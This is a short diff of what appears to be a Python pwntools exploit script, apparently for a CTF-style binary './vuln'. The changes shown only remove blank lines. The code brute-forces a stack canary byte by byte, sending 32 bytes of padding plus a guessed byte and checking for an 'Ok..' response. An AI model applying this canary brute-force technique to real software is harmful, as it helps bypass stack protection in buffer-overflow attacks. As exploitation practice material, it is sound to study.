@@ -4,7 +4,6 @@ canary=''
 
 for i in range (0,4):
     for j in range(0,256):
-
         io= process('./vuln')
         padding = 'A'*32
         
@@ -18,7 +17,6 @@ for i in range (0,4):
             if 'Ok..' in response :
                 canary+=chr(j)
                 break
-                
         except:
             pass
         io.close()
